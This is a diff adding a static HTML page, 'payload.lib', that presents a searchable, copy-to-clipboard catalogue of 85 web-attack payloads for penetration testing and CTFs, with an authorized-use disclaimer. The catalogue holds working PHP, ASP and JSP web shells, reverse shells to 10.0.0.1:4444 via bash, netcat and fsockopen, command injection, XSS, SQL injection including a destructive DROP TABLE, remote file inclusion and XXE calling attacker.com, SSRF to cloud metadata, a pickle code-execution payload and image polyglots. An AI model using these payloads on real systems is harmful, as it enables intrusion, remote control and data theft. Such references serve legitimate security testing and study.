@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Payload Library &mdash; Web AppSec &amp; CTF Reference</title>
+<style>
+  :root{
+    --bg:#0d1117; --panel:#161b22; --panel-2:#0d1117; --border:#30363d;
+    --border-soft:#21262d; --text:#e6edf3; --muted:#8b949e; --muted-2:#6e7681;
+    --accent:#3fb950; --accent-dim:#238636; --blue:#58a6ff; --amber:#d29922;
+    --code-bg:#010409; --tag-bg:#1f6feb26; --tag-fg:#79c0ff;
+    --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,"Liberation Mono",monospace;
+    --sans:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;
+  }
+  *{box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{margin:0;background:var(--bg);color:var(--text);font-family:var(--sans);
+    font-size:15px;line-height:1.5;-webkit-font-smoothing:antialiased}
+  a{color:var(--blue);text-decoration:none}
+  a:hover{text-decoration:underline}
+
+  /* Warning banner */
+  .warn{background:linear-gradient(90deg,#3d2c00,#241a00);border-bottom:1px solid #6b4f00;
+    color:#f0d67a;font-size:12.5px;padding:8px 16px;text-align:center;font-family:var(--mono)}
+  .warn b{color:#ffd75e}
+
+  /* Header */
+  header{position:sticky;top:0;z-index:30;background:rgba(13,17,23,.92);
+    backdrop-filter:blur(8px);border-bottom:1px solid var(--border);padding:14px 18px}
+  .head-row{display:flex;align-items:center;gap:14px;max-width:1200px;margin:0 auto;flex-wrap:wrap}
+  .brand{display:flex;align-items:baseline;gap:10px;white-space:nowrap}
+  .brand .dot{color:var(--accent)}
+  .brand h1{font-family:var(--mono);font-size:17px;font-weight:600;margin:0;letter-spacing:.3px}
+  .brand .sub{color:var(--muted);font-size:12px;font-family:var(--mono)}
+  .search-wrap{position:relative;flex:1;min-width:200px}
+  #search{width:100%;background:var(--panel);border:1px solid var(--border);color:var(--text);
+    border-radius:8px;padding:9px 12px 9px 34px;font-size:14px;font-family:var(--mono);outline:none}
+  #search:focus{border-color:var(--blue);box-shadow:0 0 0 3px #1f6feb33}
+  .search-wrap .ic{position:absolute;left:11px;top:50%;transform:translateY(-50%);color:var(--muted-2);font-size:14px}
+  .count{font-family:var(--mono);font-size:12px;color:var(--muted);white-space:nowrap}
+  .count b{color:var(--accent)}
+
+  /* Layout */
+  .layout{display:grid;grid-template-columns:230px 1fr;gap:0;max-width:1200px;margin:0 auto;
+    align-items:start}
+  nav.side{position:sticky;top:74px;align-self:start;padding:18px 10px 40px;
+    border-right:1px solid var(--border-soft);max-height:calc(100vh - 74px);overflow-y:auto}
+  nav.side .lbl{font-size:11px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted-2);
+    padding:6px 10px;font-weight:600}
+  nav.side a{display:flex;justify-content:space-between;align-items:center;gap:8px;color:var(--muted);
+    padding:7px 10px;border-radius:6px;font-size:13px;border-left:2px solid transparent;cursor:pointer}
+  nav.side a:hover{background:var(--panel);color:var(--text);text-decoration:none}
+  nav.side a .n{font-family:var(--mono);font-size:11px;color:var(--muted-2);background:var(--border-soft);
+    padding:1px 7px;border-radius:20px}
+  main{padding:22px 18px 80px;min-width:0}
+
+  section.cat{margin-bottom:34px;scroll-margin-top:80px}
+  .cat-head{display:flex;align-items:center;gap:10px;margin:0 0 4px;padding-bottom:8px;
+    border-bottom:1px solid var(--border-soft)}
+  .cat-head .bar{width:4px;height:20px;border-radius:2px;background:var(--c,var(--accent))}
+  .cat-head h2{margin:0;font-size:18px;font-weight:600}
+  .cat-head .cnt{font-family:var(--mono);font-size:12px;color:var(--muted-2)}
+
+  .cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:12px;margin-top:14px}
+  .card{background:var(--panel);border:1px solid var(--border);border-left:3px solid var(--c,var(--accent));
+    border-radius:8px;padding:12px 12px 10px;display:flex;flex-direction:column;min-width:0}
+  .card-top{display:flex;justify-content:space-between;align-items:flex-start;gap:8px;margin-bottom:8px}
+  .sub{font-family:var(--mono);font-size:12px;color:var(--tag-fg);background:var(--tag-bg);
+    padding:2px 8px;border-radius:20px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:70%}
+  .copy{background:var(--border-soft);border:1px solid var(--border);color:var(--muted);
+    font-family:var(--mono);font-size:11px;padding:3px 9px;border-radius:6px;cursor:pointer;
+    white-space:nowrap;transition:.12s}
+  .copy:hover{background:var(--accent-dim);border-color:var(--accent);color:#fff}
+  .copy.ok{background:var(--accent-dim);border-color:var(--accent);color:#fff}
+  pre.code{margin:0 0 8px;background:var(--code-bg);border:1px solid var(--border-soft);border-radius:6px;
+    padding:9px 10px;overflow-x:auto;font-family:var(--mono);font-size:12.5px;line-height:1.55;
+    color:#c9d1d9;white-space:pre-wrap;word-break:break-word}
+  .tok-tag{color:#7ee787}.tok-str{color:#a5d6ff}.tok-var{color:#ffa657}.tok-kw{color:#ff7b72}.tok-com{color:#8b949e}
+  .desc{color:var(--muted);font-size:12.5px;margin-top:auto}
+
+  .empty{color:var(--muted);font-family:var(--mono);padding:40px 0;text-align:center}
+
+  footer{border-top:1px solid var(--border);padding:22px 18px 40px;color:var(--muted);
+    font-size:12.5px;max-width:1200px;margin:0 auto;line-height:1.7}
+  footer .mono{font-family:var(--mono)}
+  footer strong{color:var(--amber)}
+
+  .toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%) translateY(20px);
+    background:var(--accent-dim);color:#fff;font-family:var(--mono);font-size:13px;padding:9px 16px;
+    border-radius:8px;border:1px solid var(--accent);opacity:0;pointer-events:none;transition:.2s;z-index:50}
+  .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+
+  .menu-btn{display:none;background:var(--panel);border:1px solid var(--border);color:var(--text);
+    border-radius:8px;padding:8px 11px;font-family:var(--mono);font-size:13px;cursor:pointer}
+
+  @media(max-width:820px){
+    .layout{grid-template-columns:1fr}
+    nav.side{position:fixed;top:0;left:0;bottom:0;width:250px;z-index:40;background:var(--panel-2);
+      border-right:1px solid var(--border);transform:translateX(-100%);transition:.22s;max-height:100vh;
+      padding-top:16px}
+    nav.side.open{transform:translateX(0)}
+    .menu-btn{display:inline-block}
+    .cards{grid-template-columns:1fr}
+    .scrim{position:fixed;inset:0;background:#000a;z-index:39;display:none}
+    .scrim.show{display:block}
+    .count{display:none}
+  }
+  nav.side::-webkit-scrollbar,pre.code::-webkit-scrollbar{height:8px;width:8px}
+  nav.side::-webkit-scrollbar-thumb,pre.code::-webkit-scrollbar-thumb{background:var(--border);border-radius:8px}
+  @media(prefers-reduced-motion:reduce){*{transition:none!important;scroll-behavior:auto}}
+</style>
+</head>
+<body>
+
+<div class="warn">
+  &#9888; <b>Authorized testing &amp; education only.</b> Use these payloads solely against systems you own or
+  have explicit written permission to assess. Unauthorized use may be illegal.
+</div>
+
+<header>
+  <div class="head-row">
+    <button class="menu-btn" id="menuBtn" aria-label="Toggle categories">&#9776;</button>
+    <div class="brand">
+      <span class="dot">&#9632;</span>
+      <h1>payload<span style="color:var(--muted)">.</span>lib</h1>
+      <span class="sub">web appsec &amp; CTF reference</span>
+    </div>
+    <div class="search-wrap">
+      <span class="ic">&#128269;</span>
+      <input id="search" type="text" placeholder="filter payloads &mdash; e.g. reverse, bypass, ssrf, ../"
+        autocomplete="off" spellcheck="false" aria-label="Search payloads">
+    </div>
+    <div class="count"><b id="shown">0</b> / <span id="total">0</span> payloads</div>
+  </div>
+</header>
+
+<div class="scrim" id="scrim"></div>
+<div class="layout">
+  <nav class="side" id="sidebar">
+    <div class="lbl">Categories</div>
+    <div id="navList"></div>
+  </nav>
+  <main id="main"></main>
+</div>
+
+<footer>
+  <p class="mono">payload.lib &mdash; a static, client-side reference. No tracking, no backend, no external requests.</p>
+  <p>Payload catalog structure and content inspired by
+    <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener">PayloadsAllTheThings</a>
+    and other public offensive-security references (OWASP, PortSwigger, HackTricks).</p>
+  <p><strong>For educational and authorized security testing only.</strong> The author assumes no liability for misuse.
+    Test only what you are permitted to test.</p>
+</footer>
+
+<div class="toast" id="toast">Copied to clipboard</div>
+
+<script>
+const PAYLOADS = [{"id": 1, "category": "Upload Insecure Files", "subcategory": "PHP Extensions", "payload": ".php .php3 .php4 .php5 .php7 .pht .phps .phar .phpt .pgif .phtml .phtm .inc", "description": "Default PHP extensions that may be parsed and executed by the server."}, {"id": 2, "category": "Upload Insecure Files", "subcategory": "ASP Extensions", "payload": ".asp .aspx .config .cer .asa shell.aspx;1.jpg shell.soap", "description": "ASP / ASP.NET extensions and semicolon tricks for IIS parsing quirks."}, {"id": 3, "category": "Upload Insecure Files", "subcategory": "JSP Extensions", "payload": ".jsp .jspx .jsw .jsv .jspf .wss .do .actions", "description": "JSP-family extensions that map to servlet execution."}, {"id": 4, "category": "Upload Insecure Files", "subcategory": "Perl Extensions", "payload": ".pl .pm .cgi .lib", "description": "Perl / CGI extensions that may be executed under mod_cgi."}, {"id": 5, "category": "Upload Insecure Files", "subcategory": "Coldfusion Extensions", "payload": ".cfm .cfml .cfc .dbm", "description": "Coldfusion source extensions that execute server-side."}, {"id": 6, "category": "Upload Insecure Files", "subcategory": "Node.js Extensions", "payload": ".js .json .node", "description": "Node.js-related extensions relevant on misconfigured static handlers."}, {"id": 7, "category": "Upload Insecure Files", "subcategory": "Abusable File Types", "payload": ".svg -> XXE/XSS/SSRF | .gif -> XSS | .csv -> CSV Injection | .xml -> XXE | .avi -> LFI/SSRF | .zip -> RCE/DOS | .html -> XSS/Open Redirect", "description": "Non-executable file types that carry their own injection classes."}, {"id": 8, "category": "Upload Insecure Files", "subcategory": "Double Extension", "payload": "shell.jpg.php  shell.png.php5", "description": "Trailing executable extension after an allowed one; bypasses naive suffix checks."}, {"id": 9, "category": "Upload Insecure Files", "subcategory": "Reverse Double Extension", "payload": "shell.php.jpg", "description": "Executable extension first; abuses misconfigured Apache AddHandler ordering."}, {"id": 10, "category": "Upload Insecure Files", "subcategory": "Random Case", "payload": "shell.pHp  shell.pHP5  shell.PhAr", "description": "Mixed-case extension to defeat case-sensitive blacklists."}, {"id": 11, "category": "Upload Insecure Files", "subcategory": "Null Byte", "payload": "shell.php%00.gif  shell.php%00.png  shell.php%00.jpg", "description": "Null byte terminates the string before the image suffix on vulnerable parsers."}, {"id": 12, "category": "Upload Insecure Files", "subcategory": "Special Characters", "payload": "file.php......   file.php%20   file.php%0a   file.php/   file.php.\\", "description": "Trailing dots/space/newline/slash stripped after the extension check."}, {"id": 13, "category": "Upload Insecure Files", "subcategory": "Right-to-Left Override (RTLO)", "payload": "name.%E2%80%AEphp.jpg", "description": "Unicode RTLO character reverses the visible filename so 'php.jpg' displays as 'gpj.php'."}, {"id": 14, "category": "Upload Insecure Files", "subcategory": "Magic Bytes - PNG", "payload": "\\x89PNG\\r\\n\\x1a\\n\\0\\0\\0\\rIHDR", "description": "PNG file signature to prepend so content-sniffing accepts the upload as an image."}, {"id": 15, "category": "Upload Insecure Files", "subcategory": "Magic Bytes - JPG", "payload": "\\xff\\xd8\\xff", "description": "JPEG file signature (SOI marker) for content-type sniffing bypass."}, {"id": 16, "category": "Upload Insecure Files", "subcategory": "Magic Bytes - GIF", "payload": "GIF87a    GIF8;", "description": "GIF header prefix; commonly combined with a script payload for a polyglot."}, {"id": 17, "category": "Upload Insecure Files", "subcategory": "MIME Type Spoofing", "payload": "Content-Type: image/gif    image/png    image/jpeg", "description": "Set an image MIME type in the multipart upload to bypass Content-Type validation."}, {"id": 18, "category": "Upload Insecure Files", "subcategory": ".htaccess Override", "payload": "AddType application/x-httpd-php .png", "description": "Upload a .htaccess that re-maps an allowed extension to the PHP handler."}, {"id": 19, "category": "PHP Web Shells", "subcategory": "system() GET", "payload": "<?php system($_GET['cmd']); ?>", "description": "Minimal command execution via GET parameter."}, {"id": 20, "category": "PHP Web Shells", "subcategory": "bash reverse (exec)", "payload": "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\"); ?>", "description": "Spawns an interactive reverse shell to the listener IP/port."}, {"id": 21, "category": "PHP Web Shells", "subcategory": "mkfifo reverse (nc)", "payload": "<?php system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f\"); ?>", "description": "Named-pipe reverse shell for netcat without -e support."}, {"id": 22, "category": "PHP Web Shells", "subcategory": "fsockopen reverse", "payload": "<?php $sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>", "description": "Opens a socket and dups it onto the shell's fds."}, {"id": 23, "category": "PHP Web Shells", "subcategory": "shell_exec() GET", "payload": "<?php echo shell_exec($_GET['cmd']); ?>", "description": "Returns command output to the response body."}, {"id": 24, "category": "PHP Web Shells", "subcategory": "passthru() GET", "payload": "<?php passthru($_GET['cmd']); ?>", "description": "Passes raw command output straight through."}, {"id": 25, "category": "PHP Web Shells", "subcategory": "system() POST", "payload": "<?php system($_POST['cmd']); ?>", "description": "POST variant to keep commands out of access logs/URL."}, {"id": 26, "category": "PHP Web Shells", "subcategory": "eval() POST", "payload": "<?php eval($_POST['cmd']); ?>", "description": "Evaluates arbitrary PHP supplied via POST."}, {"id": 27, "category": "PHP Web Shells", "subcategory": "dropper", "payload": "<?php file_put_contents('shell.php', '<?php system($_GET[\"c\"]); ?>'); ?>", "description": "Writes a second-stage shell to disk."}, {"id": 28, "category": "Web Shells (One-liners)", "subcategory": "PHP", "payload": "<?php system($_GET['cmd']); ?>", "description": "PHP one-liner command execution."}, {"id": 29, "category": "Web Shells (One-liners)", "subcategory": "ASP", "payload": "<% eval request(\"cmd\") %>", "description": "Classic ASP one-liner."}, {"id": 30, "category": "Web Shells (One-liners)", "subcategory": "ASP.NET", "payload": "<%= System.Diagnostics.Process.Start(Request[\"cmd\"]) %>", "description": "ASP.NET process spawn one-liner."}, {"id": 31, "category": "Web Shells (One-liners)", "subcategory": "JSP", "payload": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "description": "JSP runtime exec one-liner."}, {"id": 32, "category": "Polyglot Payloads", "subcategory": "GIF89a + PHP", "payload": "GIF89a;<?php system($_GET['cmd']); ?>", "description": "Valid GIF magic header followed by PHP; passes image sniffing yet executes."}, {"id": 33, "category": "Polyglot Payloads", "subcategory": "JPEG + PHP (exiftool)", "payload": "exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg -o shell.jpg", "description": "Embeds PHP in the JPEG comment field via exiftool."}, {"id": 34, "category": "Polyglot Payloads", "subcategory": "PNG + PHP (exiftool)", "payload": "exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.png -o shell.png", "description": "Embeds PHP in a PNG metadata chunk."}, {"id": 35, "category": "Polyglot Payloads", "subcategory": "Multiple metadata tags", "payload": "exiftool -Artist='<?php system($_GET[\"cmd\"]); ?>' -Copyright='payload' -ImageUniqueID='payload' image.jpg", "description": "Spreads the payload across several metadata fields to survive stripping of one."}, {"id": 36, "category": "Command Injection", "subcategory": "Semicolon", "payload": "; ls -la", "description": "Command separator on *nix shells."}, {"id": 37, "category": "Command Injection", "subcategory": "Pipe", "payload": "| whoami", "description": "Pipes previous output into the injected command."}, {"id": 38, "category": "Command Injection", "subcategory": "Background/AND", "payload": "& id", "description": "Runs the injected command alongside the original."}, {"id": 39, "category": "Command Injection", "subcategory": "Subshell $()", "payload": "$(cat /etc/passwd)", "description": "Command substitution."}, {"id": 40, "category": "Command Injection", "subcategory": "Backticks", "payload": "`cat /etc/passwd`", "description": "Legacy command substitution."}, {"id": 41, "category": "Command Injection", "subcategory": "Netcat reverse", "payload": "; nc -e /bin/sh 10.0.0.1 4444", "description": "Reverse shell where nc supports -e."}, {"id": 42, "category": "Command Injection", "subcategory": "Bash /dev/tcp reverse", "payload": "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "description": "Bash built-in reverse shell."}, {"id": 43, "category": "Command Injection", "subcategory": "Newline / CR", "payload": "%0a    %0d", "description": "URL-encoded newline / carriage return to break out of the command context."}, {"id": 44, "category": "Command Injection", "subcategory": "URL-encoded", "payload": "%3B%20ls%20-la", "description": "URL-encoded form of '; ls -la'."}, {"id": 45, "category": "Cross-Site Scripting (XSS)", "subcategory": "Basic script", "payload": "<script>alert('XSS')<\/script>", "description": "Canonical reflected/stored XSS probe."}, {"id": 46, "category": "Cross-Site Scripting (XSS)", "subcategory": "img onerror", "payload": "<img src=x onerror=alert(1)>", "description": "Fires on broken image load; survives many filters."}, {"id": 47, "category": "Cross-Site Scripting (XSS)", "subcategory": "svg onload", "payload": "<svg onload=alert(1)>", "description": "Executes on SVG load."}, {"id": 48, "category": "Cross-Site Scripting (XSS)", "subcategory": "body onload", "payload": "<body onload=alert(1)>", "description": "Event handler on injected body tag."}, {"id": 49, "category": "Cross-Site Scripting (XSS)", "subcategory": "javascript URI", "payload": "javascript:alert('XSS')", "description": "For href/src sinks that accept URIs."}, {"id": 50, "category": "Cross-Site Scripting (XSS)", "subcategory": "Attribute breakout", "payload": "\"><script>alert(1)<\/script>", "description": "Breaks out of an HTML attribute value."}, {"id": 51, "category": "Cross-Site Scripting (XSS)", "subcategory": "Filter-evasion polyglot", "payload": "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//--><\/SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))<\/SCRIPT>", "description": "Multi-context breakout string covering quoted JS, HTML and script contexts."}, {"id": 52, "category": "SQL Injection", "subcategory": "Auth bypass", "payload": "' OR '1'='1", "description": "Always-true condition to bypass a WHERE clause."}, {"id": 53, "category": "SQL Injection", "subcategory": "Comment login", "payload": "admin' --", "description": "Comments out the password check after the username."}, {"id": 54, "category": "SQL Injection", "subcategory": "UNION null probe", "payload": "' UNION SELECT NULL--", "description": "Probe for column count in a UNION-based injection."}, {"id": 55, "category": "SQL Injection", "subcategory": "UNION data extraction", "payload": "' UNION SELECT username, password FROM users--", "description": "Extracts credentials once column count/types align."}, {"id": 56, "category": "SQL Injection", "subcategory": "Error-based", "payload": "' AND 1=CONVERT(int, @@version)--", "description": "MSSQL type-cast error leaks the version string."}, {"id": 57, "category": "SQL Injection", "subcategory": "Time-based blind", "payload": "' AND SLEEP(5)--", "description": "MySQL boolean-blind confirmation via response delay."}, {"id": 58, "category": "SQL Injection", "subcategory": "Stacked query", "payload": "'; DROP TABLE users--", "description": "Stacked-query DDL (destructive - lab use only)."}, {"id": 59, "category": "File Inclusion (LFI/RFI)", "subcategory": "LFI - passwd", "payload": "../../../../etc/passwd", "description": "Classic *nix local file read."}, {"id": 60, "category": "File Inclusion (LFI/RFI)", "subcategory": "LFI - win.ini", "payload": "../../../../windows/win.ini", "description": "Windows LFI target for confirmation."}, {"id": 61, "category": "File Inclusion (LFI/RFI)", "subcategory": "php filter wrapper", "payload": "php://filter/convert.base64-encode/resource=index.php", "description": "Reads source of a PHP file as base64."}, {"id": 62, "category": "File Inclusion (LFI/RFI)", "subcategory": "data wrapper", "payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+", "description": "Inline base64-encoded PHP web shell via data:// wrapper."}, {"id": 63, "category": "File Inclusion (LFI/RFI)", "subcategory": "RFI", "payload": "http://attacker.com/shell.txt", "description": "Remote file inclusion when allow_url_include is on."}, {"id": 64, "category": "Server-Side Request Forgery (SSRF)", "subcategory": "AWS metadata", "payload": "http://169.254.169.254/latest/meta-data/", "description": "Cloud instance metadata endpoint (IAM creds, etc.)."}, {"id": 65, "category": "Server-Side Request Forgery (SSRF)", "subcategory": "Localhost admin", "payload": "http://127.0.0.1:8080/admin", "description": "Reach internal-only services bound to loopback."}, {"id": 66, "category": "Server-Side Request Forgery (SSRF)", "subcategory": "file scheme", "payload": "file:///etc/passwd", "description": "Local file read via file:// where the fetcher allows it."}, {"id": 67, "category": "Server-Side Request Forgery (SSRF)", "subcategory": "gopher smuggling", "payload": "gopher://localhost:8080/_GET /admin HTTP/1.0%0d%0a", "description": "Smuggle raw bytes to internal services via gopher."}, {"id": 68, "category": "Server-Side Request Forgery (SSRF)", "subcategory": "dict scheme", "payload": "dict://localhost:11211/stat", "description": "Interact with memcached/other line protocols via dict://."}, {"id": 69, "category": "XML External Entity (XXE)", "subcategory": "Classic file read", "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;<\/root>", "description": "In-band XXE reading a local file into the response."}, {"id": 70, "category": "XML External Entity (XXE)", "subcategory": "OOB parameter entity", "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://attacker.com/xxe.dtd\">%remote;]>", "description": "Loads an external DTD for out-of-band / blind exfiltration."}, {"id": 71, "category": "XML External Entity (XXE)", "subcategory": "Billion Laughs (DoS)", "payload": "<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">", "description": "Entity-expansion denial of service (lab use only)."}, {"id": 72, "category": "Deserialization", "subcategory": "PHP object", "payload": "O:4:\"User\":1:{s:4:\"name\";s:4:\"admin\";}", "description": "Serialized PHP object; mutate properties to abuse magic methods."}, {"id": 73, "category": "Deserialization", "subcategory": "Java stream magic", "payload": "AC ED 00 05   (hex)    rO0ABXNy...  (base64)", "description": "Java serialized-stream signature markers to recognise/craft gadget chains."}, {"id": 74, "category": "Deserialization", "subcategory": "Python pickle", "payload": "cos\\nsystem\\n(S'whoami'\\ntR.", "description": "Pickle opcode stream invoking os.system on load."}, {"id": 75, "category": "Deserialization", "subcategory": ".NET ViewState", "payload": "/wEPDwUJ...", "description": "MAC-less ViewState is a common .NET deserialization sink."}, {"id": 76, "category": "Path Traversal", "subcategory": "Deep traversal", "payload": "../../../../../../etc/passwd", "description": "Over-long traversal to reach filesystem root reliably."}, {"id": 77, "category": "Path Traversal", "subcategory": "Windows traversal", "payload": "..\\..\\..\\..\\windows\\win.ini", "description": "Backslash traversal for Windows targets."}, {"id": 78, "category": "Path Traversal", "subcategory": "Nested bypass", "payload": "....//....//....//etc/passwd", "description": "Defeats a single non-recursive '../' strip."}, {"id": 79, "category": "Path Traversal", "subcategory": "URL-encoded", "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "description": "Percent-encoded '../../../etc/passwd'."}, {"id": 80, "category": "Path Traversal", "subcategory": "Semicolon path", "payload": "..;/..;/..;/etc/passwd", "description": "Tomcat/Java path-parameter traversal trick."}, {"id": 81, "category": "Exiftool Commands", "subcategory": "Inject PHP comment", "payload": "exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg", "description": "Write a PHP payload into the JPEG comment tag."}, {"id": 82, "category": "Exiftool Commands", "subcategory": "Multi-tag payload", "payload": "exiftool -Copyright='Payload' -Artist='Pentest' image.jpg", "description": "Populate multiple metadata fields."}, {"id": 83, "category": "Exiftool Commands", "subcategory": "Strip all metadata", "payload": "exiftool -all= image.jpg", "description": "Remove all metadata (cleanup / OPSEC)."}, {"id": 84, "category": "Exiftool Commands", "subcategory": "Extract thumbnail", "payload": "exiftool -b -ThumbnailImage image.jpg > thumbnail.jpg", "description": "Dump an embedded thumbnail (can hide data)."}, {"id": 85, "category": "Exiftool Commands", "subcategory": "Verbose dump", "payload": "exiftool -v image.jpg", "description": "Verbose metadata inspection."}];
+const CATEGORIES = ["Upload Insecure Files", "PHP Web Shells", "Web Shells (One-liners)", "Polyglot Payloads", "Command Injection", "Cross-Site Scripting (XSS)", "SQL Injection", "File Inclusion (LFI/RFI)", "Server-Side Request Forgery (SSRF)", "XML External Entity (XXE)", "Deserialization", "Path Traversal", "Exiftool Commands"];
+
+// Per-category accent colors for the left bars / nav.
+const COLORS = {
+  "Upload Insecure Files":"#f778ba","PHP Web Shells":"#ff7b72","Web Shells (One-liners)":"#ffa657",
+  "Polyglot Payloads":"#d2a8ff","Command Injection":"#ff9492","Cross-Site Scripting (XSS)":"#7ee787",
+  "SQL Injection":"#79c0ff","File Inclusion (LFI/RFI)":"#56d4dd","Server-Side Request Forgery (SSRF)":"#f0883e",
+  "XML External Entity (XXE)":"#a5d6ff","Deserialization":"#e3b341","Path Traversal":"#6cb6ff",
+  "Exiftool Commands":"#8ddb8c"
+};
+function slug(s){return s.toLowerCase().replace(/[^a-z0-9]+/g,'-').replace(/^-|-$/g,'');}
+
+// --- lightweight, safe syntax highlighting -----------------------------
+// Operates on an already text-escaped string, so we escape first then wrap tokens.
+function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+function highlight(raw){
+  let s = esc(raw);
+  // comments (# ... at line start-ish) — keep simple
+  s = s.replace(/(&lt;\?php|\?&gt;|&lt;%=?|%&gt;)/g,'<span class="tok-tag">$1</span>');
+  s = s.replace(/(&lt;\/?[a-zA-Z][\w-]*&gt;?)/g, m => '<span class="tok-tag">'+m+'</span>');
+  s = s.replace(/(\$_?[A-Za-z_]\w*)/g,'<span class="tok-var">$1</span>');
+  s = s.replace(/\b(SELECT|UNION|FROM|WHERE|DROP|TABLE|OR|AND|NULL|CONVERT|SLEEP|SYSTEM|ENTITY|DOCTYPE)\b/g,
+        '<span class="tok-kw">$1</span>');
+  s = s.replace(/(&#39;[^&]*?&#39;|&quot;[^&]*?&quot;)/g,'<span class="tok-str">$1</span>');
+  return s;
+}
+
+// --- clipboard with fallback -------------------------------------------
+function copyText(text){
+  if(navigator.clipboard && window.isSecureContext){
+    return navigator.clipboard.writeText(text);
+  }
+  return new Promise((res,rej)=>{
+    const ta=document.createElement('textarea');
+    ta.value=text; ta.style.position='fixed'; ta.style.opacity='0';
+    document.body.appendChild(ta); ta.focus(); ta.select();
+    try{document.execCommand('copy');res();}catch(e){rej(e);}finally{document.body.removeChild(ta);}
+  });
+}
+let toastT;
+function toast(msg){
+  const t=document.getElementById('toast'); t.textContent=msg; t.classList.add('show');
+  clearTimeout(toastT); toastT=setTimeout(()=>t.classList.remove('show'),1400);
+}
+
+// --- render -------------------------------------------------------------
+const main=document.getElementById('main');
+const navList=document.getElementById('navList');
+
+function build(){
+  navList.innerHTML=''; main.innerHTML='';
+  CATEGORIES.forEach(cat=>{
+    const items=PAYLOADS.filter(p=>p.category===cat);
+    const color=COLORS[cat]||'var(--accent)';
+    // nav
+    const a=document.createElement('a');
+    a.dataset.cat=cat; a.style.borderLeftColor=color;
+    a.innerHTML='<span>'+esc(cat)+'</span><span class="n">'+items.length+'</span>';
+    a.onclick=()=>{document.getElementById('cat-'+slug(cat)).scrollIntoView();closeMenu();};
+    navList.appendChild(a);
+    // section
+    const sec=document.createElement('section');
+    sec.className='cat'; sec.id='cat-'+slug(cat); sec.dataset.cat=cat;
+    sec.style.setProperty('--c',color);
+    const h=document.createElement('div'); h.className='cat-head';
+    h.innerHTML='<span class="bar"></span><h2>'+esc(cat)+'</h2><span class="cnt">'+items.length+' payloads</span>';
+    sec.appendChild(h);
+    const grid=document.createElement('div'); grid.className='cards';
+    items.forEach(p=>grid.appendChild(cardEl(p,color)));
+    sec.appendChild(grid);
+    main.appendChild(sec);
+  });
+  document.getElementById('total').textContent=PAYLOADS.length;
+}
+
+function cardEl(p,color){
+  const c=document.createElement('div'); c.className='card'; c.style.setProperty('--c',color);
+  c.dataset.hay=(p.category+' '+p.subcategory+' '+p.payload+' '+p.description).toLowerCase();
+
+  const top=document.createElement('div'); top.className='card-top';
+  const sub=document.createElement('span'); sub.className='sub'; sub.textContent=p.subcategory; sub.title=p.subcategory;
+  const btn=document.createElement('button'); btn.className='copy'; btn.textContent='copy';
+  btn.onclick=()=>{copyText(p.payload).then(()=>{
+      btn.textContent='copied'; btn.classList.add('ok'); toast('Copied to clipboard');
+      setTimeout(()=>{btn.textContent='copy';btn.classList.remove('ok');},1100);
+    }).catch(()=>toast('Copy failed'));};
+  top.appendChild(sub); top.appendChild(btn);
+
+  const pre=document.createElement('pre'); pre.className='code'; pre.innerHTML=highlight(p.payload);
+  const d=document.createElement('div'); d.className='desc'; d.textContent=p.description;
+
+  c.appendChild(top); c.appendChild(pre); c.appendChild(d);
+  return c;
+}
+
+// --- search -------------------------------------------------------------
+const shownEl=document.getElementById('shown');
+function applyFilter(q){
+  q=q.trim().toLowerCase();
+  let shown=0;
+  document.querySelectorAll('section.cat').forEach(sec=>{
+    let visible=0;
+    sec.querySelectorAll('.card').forEach(card=>{
+      const match=!q||card.dataset.hay.includes(q);
+      card.style.display=match?'':'none';
+      if(match){visible++;shown++;}
+    });
+    sec.style.display=visible?'':'none';
+  });
+  shownEl.textContent=shown;
+  let empty=document.getElementById('empty');
+  if(!shown){
+    if(!empty){empty=document.createElement('div');empty.id='empty';empty.className='empty';main.appendChild(empty);}
+    empty.textContent='No payloads match "'+q+'"';
+  }else if(empty){empty.remove();}
+}
+
+// --- mobile menu --------------------------------------------------------
+const sidebar=document.getElementById('sidebar'),scrim=document.getElementById('scrim');
+function closeMenu(){sidebar.classList.remove('open');scrim.classList.remove('show');}
+document.getElementById('menuBtn').onclick=()=>{sidebar.classList.toggle('open');scrim.classList.toggle('show');};
+scrim.onclick=closeMenu;
+
+document.getElementById('search').addEventListener('input',e=>applyFilter(e.target.value));
+
+build();
+applyFilter('');
+</script>
+</body>
+</html>
